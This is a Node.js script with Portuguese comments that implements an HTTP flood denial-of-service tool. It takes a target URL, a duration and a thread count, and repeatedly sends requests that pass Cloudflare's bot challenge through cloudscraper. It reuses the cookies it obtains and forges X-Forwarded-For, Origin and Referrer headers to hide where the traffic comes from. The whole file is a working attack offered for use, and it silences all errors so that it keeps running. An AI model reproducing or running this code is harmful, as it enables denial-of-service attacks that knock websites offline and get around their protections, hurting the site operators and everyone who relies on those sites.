// Importa as bibliotecas necessárias
const cloudscraper = require('cloudscraper');
const request = require('request');
const args = process.argv.slice(2);

// Lida com exceções não capturadas para evitar a interrupção do programa
process.on('uncaughtException', () => { "Hi" });
process.on('unhandledRejection', () => { "Hi" });

// Verifica se o número de argumentos fornecidos é menor ou igual a 2
if (process.argv.length <= 2) {
    console.log(`[Usage] node cf.js <url> <time> <threads>`);
    console.log(`[Example] node cf.js example.com 60`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}

// Função para gerar um endereço IP aleatório
const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

// Função para gerar uma string aleatória de comprimento l
const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

// Obtém a URL, o tempo de duração e o número de threads dos argumentos de linha de comando
const url = process.argv[2]
const time = Number(process.argv[3])
const threads = Number(process.argv[4]) || 1;

console.log(`[Info] Iniciando ataque de ${time} segundos em ${url} com ${threads} threads`);

// Inicia o ataque usando o número especificado de threads
for (let i = 0; i < threads; i++) {
    const int = setInterval(() => {
        // Usa a biblioteca cloudscraper para contornar o desafio de proteção do Cloudflare
        cloudscraper.get(url, function (e, r, b) {
            if (e) return;
            // Extrai o cookie e o User-Agent da resposta
            const cookie = r.request.headers.request.cookie;
            const useragent = r.request.headers['User-Agent'];
            // Gera um endereço IP aleatório
            const ip = rIp();
            // Envia uma requisição usando a biblioteca request
            request({
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referrer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': ip
                }
            });
        });
    });

    // Define um temporizador para parar a thread após o tempo especificado
    setTimeout(() => clearInterval(int), time * 1000);
}
